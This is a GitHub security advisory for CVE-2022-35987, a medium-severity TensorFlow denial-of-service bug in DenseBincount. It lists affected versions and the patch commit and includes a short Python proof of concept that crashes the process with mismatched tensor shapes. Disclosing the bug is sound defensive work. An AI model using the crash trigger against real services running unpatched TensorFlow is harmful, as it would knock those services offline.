# [M] TensorFlow vulnerable to `CHECK` fail in `DenseBincount`

## Summary
Severity: Medium
Advisory: GHSA-w62h-8xjm-fv49
CVE: CVE-2022-35987
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-w62h-8xjm-fv49
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
`DenseBincount` assumes its input tensor `weights` to either have the same shape as its input tensor `input` or to be length-0. A different `weights` shape will trigger a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
binary_output = True
input = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)
```

### Patches
We have patched the issue in GitHub commit [bf4c14353c2328636a18bfad1e151052c81d5f43](https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w62h-8xjm-fv49
- https://nvd.nist.gov/vuln/detail/CVE-2022-35987
- https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
